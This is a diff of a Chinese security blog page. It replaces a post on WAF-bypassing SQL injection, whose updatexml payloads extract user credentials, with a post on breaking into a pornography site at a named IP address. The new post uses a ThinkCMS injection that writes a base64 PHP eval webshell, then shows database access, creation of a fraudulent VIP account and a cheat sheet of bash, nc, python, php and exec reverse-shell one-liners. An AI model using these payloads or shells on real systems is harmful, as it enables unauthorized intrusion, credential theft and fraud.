@@ -79,26 +79,28 @@
 
 
 
-<meta name="description" content="这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;amp;classid=884 判断注入点1newsid=28671&apos;&amp;amp;classid=884   进一步判断 123&apos;and 1=1 //报错&apos;and">
+<meta name="description" content="该站点是本人同事分享给我的，本着技术学习的目的就对这个站点进行了一下简单的测试。 渗透流程确定目标站点http://156.236.127.158/ 对站点进行目录爆破这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。  简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。 开始渗透注">
 <meta property="og:type" content="article">
-<meta property="og:title" content="纪录项目中一次简单的SQL注入bypass">
-<meta property="og:url" content="http://yoursite.com/2019/07/12/job-first-bypass/index.html">
+<meta property="og:title" content="纪录对黄站的一次渗透测试">
+<meta property="og:url" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/index.html">
 <meta property="og:site_name" content="PippyBear的博客">
-<meta property="og:description" content="这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;amp;classid=884 判断注入点1newsid=28671&apos;&amp;amp;classid=884   进一步判断 123&apos;and 1=1 //报错&apos;and">
+<meta property="og:description" content="该站点是本人同事分享给我的，本着技术学习的目的就对这个站点进行了一下简单的测试。 渗透流程确定目标站点http://156.236.127.158/ 对站点进行目录爆破这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。  简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。 开始渗透注">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/2.png">
-<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/3.png">
-<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/4.png">
-<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/5.png">
-<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/6.png">
-<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/7.png">
-<meta property="og:image" content="http://yoursite.com/2019/07/12/job-first-bypass/8.png">
-<meta property="og:updated_time" content="2019-09-16T02:40:54.063Z">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/6.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/7.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/8.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/9.png">
+<meta property="og:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/10.png">
+<meta property="og:updated_time" content="2019-11-06T08:16:23.895Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="纪录项目中一次简单的SQL注入bypass">
-<meta name="twitter:description" content="这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。 目标站点：https://www.xxx.com/注入点：https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;amp;classid=884 判断注入点1newsid=28671&apos;&amp;amp;classid=884   进一步判断 123&apos;and 1=1 //报错&apos;and">
-<meta name="twitter:image" content="http://yoursite.com/2019/07/12/job-first-bypass/1.png">
+<meta name="twitter:title" content="纪录对黄站的一次渗透测试">
+<meta name="twitter:description" content="该站点是本人同事分享给我的，本着技术学习的目的就对这个站点进行了一下简单的测试。 渗透流程确定目标站点http://156.236.127.158/ 对站点进行目录爆破这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。  简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。 开始渗透注">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/1.png">
 
 
 
@@ -128,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/12/job-first-bypass/">
+  <link rel="canonical" href="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/">
 
 
 
 
 
-  <title>纪录项目中一次简单的SQL注入bypass | PippyBear的博客</title>
+  <title>纪录对黄站的一次渗透测试 | PippyBear的博客</title>
   
 
 
@@ -303,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/12/job-first-bypass/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/06/One-the-yellow-penetration-test/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="PippyBear">
@@ -320,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">纪录项目中一次简单的SQL注入bypass</h1>
+          <h1 class="post-title" itemprop="name headline">纪录对黄站的一次渗透测试</h1>
         
 
         <div class="post-meta">
@@ -332,8 +334,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-12T00:44:18+08:00">
-                2019-07-12
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-06T14:21:37+08:00">
+                2019-11-06
               </time>
             
 
@@ -401,58 +403,55 @@
       
 
       
-        <p>这篇文章是本人在项目中遇到的一个sql注入bypass的纪录。</p>
-<p>目标站点：<a href="https://www.xxx.com/" target="_blank" rel="noopener">https://www.xxx.com/</a><br>注入点：<a href="https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;classid=884" target="_blank" rel="noopener">https://www.xxx.com/include/ty/view_score.php?newsid=28671&amp;classid=884</a></p>
-<h2 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">newsid=28671<span class="string">'&amp;classid=884</span></span><br></pre></td></tr></table></figure>
+        <p>该站点是本人同事分享给我的，本着技术学习的目的就对这个站点进行了一下简单的测试。</p>
+<h2 id="渗透流程"><a href="#渗透流程" class="headerlink" title="渗透流程"></a>渗透流程</h2><h3 id="确定目标站点"><a href="#确定目标站点" class="headerlink" title="确定目标站点"></a>确定目标站点</h3><p><a href="http://156.236.127.158/" target="_blank" rel="noopener">http://156.236.127.158/</a></p>
+<h3 id="对站点进行目录爆破"><a href="#对站点进行目录爆破" class="headerlink" title="对站点进行目录爆破"></a>对站点进行目录爆破</h3><p>这里我使用的是御剑和dirsearch-master、该过程中没有发现什么特别的东西，就发现了一个phpinfo页面和一个后台地址。</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/1.png" alt></p>
+<p>简单的过了一下没有发现什么可用的数据。那只有硬着头皮去看主体内容有没有可挖掘的东西。</p>
+<h2 id="开始渗透"><a href="#开始渗透" class="headerlink" title="开始渗透"></a>开始渗透</h2><h3 id="注册用户进行渗透"><a href="#注册用户进行渗透" class="headerlink" title="注册用户进行渗透"></a>注册用户进行渗透</h3><p>注册用户，想看看用户是否有可上传文件的地方（比如上传头像），注册成功后发现并没有，个人信息处只有一个修改登录密码的功能。然后想着是否可以越权修改他人密码比如管理员的。抓包全面检查了一下参数，发现并没有明显的逻辑漏洞。<br>这里因为没有发现可利用的数据，所以就没有截图。</p>
+<h3 id="对后台地址进行渗透"><a href="#对后台地址进行渗透" class="headerlink" title="对后台地址进行渗透"></a>对后台地址进行渗透</h3><p>发现前台登录没有明显的可利用漏洞，于是联想到之前爆目录爆出来的后台地址，精神又大振，尝试了一下admin登录，系统提示密码错误。神经瞬间亢奋，习惯性的进行了一波注入测试，发现并不存在。抓包看了一下响应包，发现不存在明显的逻辑特征。</p>
+<p>同样这里因为没有收获，就没有截图。</p>
+<h3 id="对主体内容进行渗透"><a href="#对主体内容进行渗透" class="headerlink" title="对主体内容进行渗透"></a>对主体内容进行渗透</h3><p>经过对流量的抓包和回放测试，发现了一个SQL注入漏洞，习惯性的丢到sqlmap里面去跑。</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/2.png" alt></p>
+<p>但sqlmap似乎测试不出这是什么数据库，估计是过滤了一些关键字眼。本来是想着进行手注一下的，然后无意输入了一个错误路径，报错信息令我神经振奋。这是一个thinkcms的站，啥也不说payload走起。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=<span class="string">''</span>&amp;content=&lt;php&gt;file_put_contents(<span class="string">'info.php'</span>,base64_decode(<span class="string">'PD9waHAgZXZhbCgkX1BPU1RbJ2FiYyddKTs/Pg=='</span>))&lt;/php&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/07/12/job-first-bypass/1.png" alt></p>
-<p>进一步判断</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and 1=1 //报错</span></span><br><span class="line"><span class="string">'</span>and 1=<span class="string">'1 //不报错</span></span><br><span class="line"><span class="string">'</span>and <span class="string">'1'</span>=<span class="string">'1 //不报错</span></span><br></pre></td></tr></table></figure>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/3.png" alt></p>
+<p>这是直接上传到根目录，访问一波文件存在且解析成功，直接菜刀连接。</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/4.png" alt></p>
+<p>进行dos命令发现不成功，估计站点老哥做了一些安全限制。</p>
+<p>无奈只有去找其他的可用信息，查找了一下站点的配置信息，发现了数据库的配置信息。</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/5.png" alt></p>
+<p>这里直接上传一波大马（其实没必要），只是想满足一下自己。</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/6.png" alt><br><img src="/2019/11/06/One-the-yellow-penetration-test/7.png" alt></p>
+<p>连接数据库，找到VIP用户对应的表，新建了一个拥有几万块钱的用户的账户，随手就开了一个永久VIP，刺激。</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/8.png" alt></p>
+<p>这里最刺激的是可以提现，但是作为良好公民的我，哪怕是非法站点我也是不会对它薅羊毛的。<br>最后看了一下，简单的尝试了一下nc反弹shell，shell是成功反弹了，但是命令似乎依旧无法执行，算了，目的已经达到就点到为止了。</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/9.png" alt></p>
+<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><p>几天过后，想了想，还是觉得前面做的太浅了。于是想回去对流量做一个转发，进行一下后渗透。结果发现站长老哥发现异常了，把站给关了。</p>
+<p><img src="/2019/11/06/One-the-yellow-penetration-test/10.png" alt></p>
+<p>没有办法，只好到此为止。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="常见shell反弹总结"><a href="#常见shell反弹总结" class="headerlink" title="常见shell反弹总结"></a>常见shell反弹总结</h3><p>可以根据服务器上面存在的进行利用。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis bash nc php python ecex</span><br></pre></td></tr></table></figure>
 
-<p>最终确定了这是一个注入点</p>
-<h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><p>按照常规的思路，准备先order by爆一下字段，然后在逐步爆库、表以及用户信息。</p>
-<h3 id="常规思路注入"><a href="#常规思路注入" class="headerlink" title="常规思路注入"></a>常规思路注入</h3><p>先手order by</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'order by 10--+ //Unknown column '</span>10<span class="string">' in '</span>order clause<span class="string">'1054</span></span><br><span class="line"><span class="string">'</span>order by 2--+ //Unknown column <span class="string">'2'</span> <span class="keyword">in</span> <span class="string">'order clause'</span>1054</span><br><span class="line"><span class="string">'order by 1--+ //成功</span></span><br></pre></td></tr></table></figure>
+<p>可以采用上述方式进行查看。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1</span><br><span class="line">/bin/sh -i &gt;&amp; /dev/tcp/公网主机IP/端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
-<p>说明只有1个字段，继续进行。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union select user()--+ //拦截</span></span><br><span class="line"><span class="string">'</span>union--+ //不拦截</span><br><span class="line"><span class="string">'union user()--+ //不拦截</span></span><br></pre></td></tr></table></figure>
+<p>这里简单解释一下:<br>bash -i 打开一个交互的bash,&gt;&amp; 将标准错误输出重定向到标准输出<br>/dev/tcp/x.x.x.x/port 意为调用socket,建立socket连接,其中x.x.x.x为要反弹到的主机ip，port为端口 0&gt;&amp;1 标准输入重定向到标准输出，实现你与反弹出来的shell的交互。</p>
+<p>用bash反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 公网主机IP 端口</span><br><span class="line">rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 公网主机IP 端口 &gt;/tmp/f</span><br></pre></td></tr></table></figure>
 
-<p>这里猜测拦截了select</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'union /*!select*/ user()--+ //拦截</span></span><br><span class="line"><span class="string">'</span>union sElect user()--+ //拦截</span><br><span class="line"><span class="string">'union sel%0aect user()--+ //不拦截，但是报错</span></span><br><span class="line"><span class="string">'</span>union sel%0aect user()--+ //不拦截，但是报错</span><br><span class="line"><span class="string">'union sel/**/ect user()--+ //不拦截，但是报错</span></span><br></pre></td></tr></table></figure>
+<p>用python反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("公网主机IP",端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>
 
-<p>emmmmm，到这里我已经绝望了，不得不说这后端处理写的对于我这种新手来说是真的凶残。自顾自的看了一会注入的文章，忽然发现可以采用updatexml报错注入，立刻又开始。</p>
-<p>稍稍普及一下updatexml报错注入</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure>
+<p>用php反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("公网主机IP",端口);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
 
-<p>官方的东西可能说的不太接地气，直接操作一波大家就知道有什么作用了。<br><img src="/2019/07/12/job-first-bypass/2.png" alt><br>大概就是concat将datbase(),user()等返回信息字符串化，然后因为updatexml的第二个参数需要Xpath格式的字符串,所以不符合要求，返回报错信息。</p>
-<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><h4 id="获取当前用户"><a href="#获取当前用户" class="headerlink" title="获取当前用户"></a>获取当前用户</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and updatexml(1,concat(0x3a,(select user())),1) //被拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml() //不拦截</span><br><span class="line"><span class="string">'and updatexml(1,concat(),1)//拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,con%a0cat(),1)//不拦截，但是报错</span><br><span class="line"><span class="string">'and updatexml(1,con%00cat(),1)// 不拦截，但是报错</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,con%0acat(),1) // 不拦截，但是报错</span><br><span class="line"><span class="string">'and updatexml(1,/*!concat*/(),1)//不拦截，不报错</span></span><br></pre></td></tr></table></figure>
+<p>用exec反弹</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/&lt;your_vps&gt;/1024; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
 
-<p>通过以上步骤推论waf拦截concant()函数，继续进行。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and updatexml(1,/*!concat*/(0x3a,(select user())),1)//拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,/*!concat*/(0x3a,(select)),1)//拦截</span><br><span class="line"><span class="string">'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) // 不拦截</span></span><br></pre></td></tr></table></figure>
-
-<p>通过以上步骤推论waf还拦截了select，继续进行。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+ //发现页面不响应</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) and <span class="string">'//拦截</span></span><br><span class="line"><span class="string">'</span>and updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1) /*!and*/ <span class="string">' 成功</span></span><br><span class="line"><span class="string">'</span>and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ user())),1)--+//成功</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/07/12/job-first-bypass/3.png" alt></p>
-<h4 id="获取当前数据库"><a href="#获取当前数据库" class="headerlink" title="获取当前数据库"></a>获取当前数据库</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ database())),1)--+</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/07/12/job-first-bypass/4.png" alt><br>获取到当前数据库和用户后，继续按照常规思路，爆库、爆表、爆字段。</p>
-<h4 id="爆库、爆表、爆字段"><a href="#爆库、爆表、爆字段" class="headerlink" title="爆库、爆表、爆字段"></a>爆库、爆表、爆字段</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from information_schema.schemata limit 0,1)),1)--+ //拦截</span></span><br><span class="line"><span class="string">'</span>and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ schema_name from /*!information_schema.schemata*/ <span class="built_in">limit</span> 0,1)),1)--+//拦截</span><br><span class="line"><span class="string">'and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/schema_name from /*!information0x5fschema.schemata*/ limit 0,1)),1)--+    //成功</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/07/12/job-first-bypass/5.png" alt></p>
-<p>虽然执行成功，但似乎限制了权限。思考了很久，正准备放弃的时候，同站点另外一个注入点吸引了我。</p>
-<p><img src="/2019/07/12/job-first-bypass/6.png" alt></p>
-<p>这里报错直接把sql语句给提示出来了，刚刚好有我们需要的表信息，二话不说，进一步尝试。</p>
-<p>直接按照之前bypass的特点，一步到位。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ username from phome_enewsuser limit 0,1)),1)--+&amp;classid=834</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/07/12/job-first-bypass/7.png" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' and 1=updatexml(1,/*!concat*/(0x3a,(/*!select*/ password from phome_enewsuser limit 0,1)),1)--+&amp;classid=834</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/2019/07/12/job-first-bypass/8.png" alt></p>
-<p>总结</p>
-<p>任何时候都不要放弃尝试，说不定试着试着就出来了。</p>
-<p>推荐阅读：<br>我的WafBypass之道（SQL注入篇）<br><a href="http://www.moonsec.com/post-299.html" target="_blank" rel="noopener">http://www.moonsec.com/post-299.html</a></p>
+<h3 id="渗透总结"><a href="#渗透总结" class="headerlink" title="渗透总结"></a>渗透总结</h3><p>拿下站后，不能把动静弄的太大，不要小瞧开发老哥。然后就是不要干违法的事，谢谢！</p>
+<p>推荐阅读<br><a href="https://www.freebuf.com/vuls/211842.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/211842.html</a><br><a href="https://www.freebuf.com/vuls/211847.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/211847.html</a></p>
 
       
     </div>
@@ -477,8 +476,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/09/hello-world/" rel="next" title="Hello World">
-                <i class="fa fa-chevron-left"></i> Hello World
+              <a href="/2019/09/02/One-Test-Bypass-webshell/" rel="next" title="没有数字和字母的webshell思考">
+                <i class="fa fa-chevron-left"></i> 没有数字和字母的webshell思考
               </a>
             
           </div>
@@ -486,10 +485,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/25/the-first-accessInjection/" rel="prev" title="纪录一次完整的access注入">
-                纪录一次完整的access注入 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -619,7 +614,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#判断注入点"><span class="nav-number">1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#获取信息"><span class="nav-number">2.</span> <span class="nav-text">获取信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常规思路注入"><span class="nav-number">2.1.</span> <span class="nav-text">常规思路注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#updatexml报错注入"><span class="nav-number">2.2.</span> <span class="nav-text">updatexml报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获取当前用户"><span class="nav-number">2.2.1.</span> <span class="nav-text">获取当前用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取当前数据库"><span class="nav-number">2.2.2.</span> <span class="nav-text">获取当前数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆库、爆表、爆字段"><span class="nav-number">2.2.3.</span> <span class="nav-text">爆库、爆表、爆字段</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#渗透流程"><span class="nav-number">1.</span> <span class="nav-text">渗透流程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#确定目标站点"><span class="nav-number">1.1.</span> <span class="nav-text">确定目标站点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对站点进行目录爆破"><span class="nav-number">1.2.</span> <span class="nav-text">对站点进行目录爆破</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始渗透"><span class="nav-number">2.</span> <span class="nav-text">开始渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注册用户进行渗透"><span class="nav-number">2.1.</span> <span class="nav-text">注册用户进行渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对后台地址进行渗透"><span class="nav-number">2.2.</span> <span class="nav-text">对后台地址进行渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对主体内容进行渗透"><span class="nav-number">2.3.</span> <span class="nav-text">对主体内容进行渗透</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后渗透"><span class="nav-number">2.4.</span> <span class="nav-text">后渗透</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常见shell反弹总结"><span class="nav-number">3.1.</span> <span class="nav-text">常见shell反弹总结</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#渗透总结"><span class="nav-number">3.2.</span> <span class="nav-text">渗透总结</span></a></li></ol></li></ol></div>
             
 
           </div>
